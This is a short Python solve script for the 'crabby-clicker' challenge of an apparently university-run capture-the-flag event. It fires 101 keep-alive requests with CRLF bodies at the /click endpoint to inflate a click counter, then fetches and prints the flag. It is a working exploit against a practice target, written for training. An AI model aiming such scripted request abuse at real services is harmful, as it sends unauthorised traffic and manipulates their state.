import requests

s = requests.Session()

headers = {
    "Host": "http://crabby-clicker.ctf.umasscybersec.org/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    "Connection": "keep-alive"
}

s.headers.update(headers)

attack_url = "http://crabby-clicker.ctf.umasscybersec.org/click"
flag_url = "http://crabby-clicker.ctf.umasscybersec.org/flag"

responses = [s.get(attack_url, headers=headers, data="\r\n\r\n") for _ in range(101)]
flag = s.get(flag_url, data="\r\n\r\n")
print (flag.text)

for response in responses:
    print(response.text)
